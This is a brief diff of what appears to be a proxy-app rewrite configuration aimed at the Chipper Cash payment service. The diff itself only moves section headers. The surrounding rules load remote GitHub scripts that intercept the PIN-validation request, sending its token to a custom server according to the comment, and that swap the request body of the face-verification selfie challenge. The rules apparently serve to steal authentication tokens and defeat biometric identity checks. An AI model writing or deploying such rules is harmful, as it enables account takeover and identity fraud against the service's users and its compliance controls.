@@ -1,7 +1,7 @@
-[Script]
+[rewrite_local]
 # 拦截并处理 Token，然后发送到自定义服务器
 http-request ^https:\/\/auth\.chippercash\.com\/pin\/validate script-path=https://raw.githubusercontent.com/chucyfunny/chippertest/main/test.js
-[rewrite_local]
+
 # 拦截并替换 selfie 的请求体
 script-request-body ^https:\/\/compliance\.chippercash\.com\/face-verification\/selfie_challenge$ script-path=https://raw.githubusercontent.com/chucyfunny/chippertest/main/face.js
 
